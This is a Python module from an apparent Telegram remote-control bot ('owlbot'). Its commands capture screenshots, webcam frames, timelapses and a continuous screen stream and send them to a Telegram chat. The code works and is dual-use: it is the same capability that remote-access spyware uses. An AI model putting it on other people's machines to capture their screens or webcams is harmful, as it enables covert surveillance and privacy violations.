"""
Screen module — /screenshot, /webcam, /timelapse, /startstream, /stopstream
Cross-platform module using pyautogui, opencv-python, numpy (optional dependencies).
"""
from __future__ import annotations

import logging
import tempfile
import threading
import time

from owlbot.core.utils import animate_message, finish_animation, safe_unlink
from owlbot.modules.base import BaseModule

logger = logging.getLogger("owlbot.modules.screen")


class ScreenModule(BaseModule):
    name = "screen"

    def __init__(self, *args: object, **kwargs: object) -> None:
        super().__init__(*args, **kwargs)
        self._streaming = False

    def register(self) -> None:  # noqa: C901
        bot, auth, safe = self.bot, self.auth, self.safe
        cfg = self.config

        @bot.message_handler(commands=["screenshot"])
        @auth
        @safe
        def cmd_screenshot(message: object) -> None:
            bot.send_chat_action(message.chat.id, "upload_photo")
            anim_msg = animate_message(
                bot, message.chat.id,
                ["📸 *Capturing screen…* 🖥️", "📸 *Capturing screen…* 🖥️✨"],
            )
            import pyautogui
            img = pyautogui.screenshot()
            with tempfile.NamedTemporaryFile(delete=False, suffix=".jpg") as f:
                tmp = f.name
            img.save(tmp, quality=cfg.screenshot_quality)
            try:
                finish_animation(bot, anim_msg, message.chat.id, "✅ *Screenshot ready — sending…*")
                with open(tmp, "rb") as f:
                    bot.send_photo(message.chat.id, f, caption="📸 Screenshot")
            finally:
                safe_unlink(tmp)

        @bot.message_handler(commands=["webcam"])
        @auth
        @safe
        def cmd_webcam(message: object) -> None:
            bot.send_chat_action(message.chat.id, "upload_photo")
            anim_msg = animate_message(
                bot, message.chat.id,
                ["📷 *Capturing webcam…* 📸", "📷 *Capturing webcam…* 📸✨"],
            )
            import cv2
            cap = cv2.VideoCapture(0)
            if not cap.isOpened():
                finish_animation(bot, anim_msg, message.chat.id, "❌ Webcam not available.")
                return
            ret, frame = cap.read()
            cap.release()
            if not ret:
                finish_animation(bot, anim_msg, message.chat.id, "❌ Failed to capture webcam frame.")
                return
            with tempfile.NamedTemporaryFile(delete=False, suffix=".jpg") as f:
                tmp = f.name
            cv2.imwrite(tmp, frame)
            try:
                finish_animation(bot, anim_msg, message.chat.id, "✅ *Webcam ready — sending…*")
                with open(tmp, "rb") as f:
                    bot.send_photo(message.chat.id, f, caption="📷 Webcam")
            finally:
                safe_unlink(tmp)

        @bot.message_handler(commands=["timelapse"])
        @auth
        @safe
        def cmd_timelapse(message: object) -> None:
            import pyautogui
            parts = message.text.split()  # type: ignore[attr-defined]
            if len(parts) < 3:
                bot.reply_to(message, "Usage: `/timelapse <interval_sec> <count>`", parse_mode="Markdown")
                return
            try:
                interval, count = int(parts[1]), int(parts[2])
            except ValueError:
                bot.reply_to(message, "❌ Both values must be integers.")
                return
            if interval <= 0 or not 1 <= count <= cfg.max_timelapse_count:
                bot.reply_to(message, f"❌ Interval > 0 and count 1–{cfg.max_timelapse_count}.")
                return
            bot.reply_to(
                message,
                f"📸 *Timelapse started* — {count} shots every {interval}s",
                parse_mode="Markdown",
            )
            for i in range(count):
                bot.send_chat_action(message.chat.id, "upload_photo")
                img = pyautogui.screenshot()
                with tempfile.NamedTemporaryFile(delete=False, suffix=".jpg") as f:
                    tmp = f.name
                img.save(tmp, quality=cfg.screenshot_quality)
                try:
                    with open(tmp, "rb") as f:
                        bot.send_photo(message.chat.id, f, caption=f"📸 {i + 1}/{count}")
                finally:
                    safe_unlink(tmp)
                if i < count - 1:
                    time.sleep(interval)
            bot.reply_to(message, "✅ *Timelapse complete.*", parse_mode="Markdown")

        @bot.message_handler(commands=["startstream"])
        @auth
        @safe
        def cmd_start_stream(message: object) -> None:
            if self._streaming:
                bot.reply_to(message, "⚠️ Stream already active. Use /stopstream first.")
                return
            self._streaming = True
            threading.Thread(target=self._stream_worker, args=(message.chat.id,), daemon=True).start()
            bot.reply_to(message, "📺 *Screen stream started.* Use /stopstream to stop.", parse_mode="Markdown")

        @bot.message_handler(commands=["stopstream"])
        @auth
        @safe
        def cmd_stop_stream(message: object) -> None:
            if not self._streaming:
                bot.reply_to(message, "⚠️ No active stream.")
                return
            self._streaming = False
            bot.reply_to(message, "🛑 *Stream stopping* — video will arrive shortly.", parse_mode="Markdown")

    def _stream_worker(self, chat_id: int) -> None:
        import cv2
        import numpy as np
        import pyautogui
        cfg = self.config
        bot = self.bot
        screen_size = pyautogui.size()
        fourcc = cv2.VideoWriter_fourcc(*"mp4v")
        vid_path = tempfile.mktemp(suffix=".mp4")
        writer = cv2.VideoWriter(vid_path, fourcc, float(cfg.stream_fps), screen_size)
        last_photo = 0.0
        try:
            while self._streaming:
                frame = cv2.cvtColor(np.array(pyautogui.screenshot()), cv2.COLOR_RGB2BGR)
                writer.write(frame)
                now = time.time()
                if now - last_photo >= cfg.stream_photo_interval:
                    bot.send_chat_action(chat_id, "upload_photo")
                    ok, jpeg = cv2.imencode(
                        ".jpg", frame,
                        [int(cv2.IMWRITE_JPEG_QUALITY), cfg.stream_jpeg_quality],
                    )
                    if ok:
                        bot.send_photo(chat_id, jpeg.tobytes())
                    last_photo = now
                time.sleep(cfg.stream_frame_delay)
        except Exception as exc:
            logger.exception("Streaming error for chat_id=%s", chat_id)
            bot.send_message(chat_id, f"❌ Streaming error: {exc}")
        finally:
            writer.release()
            bot.send_message(chat_id, "🎥 *Screen stream stopped.*", parse_mode="Markdown")
            if vid_path:
                bot.send_chat_action(chat_id, "upload_video")
                with open(vid_path, "rb") as f:
                    bot.send_video(chat_id, f)
                safe_unlink(vid_path)
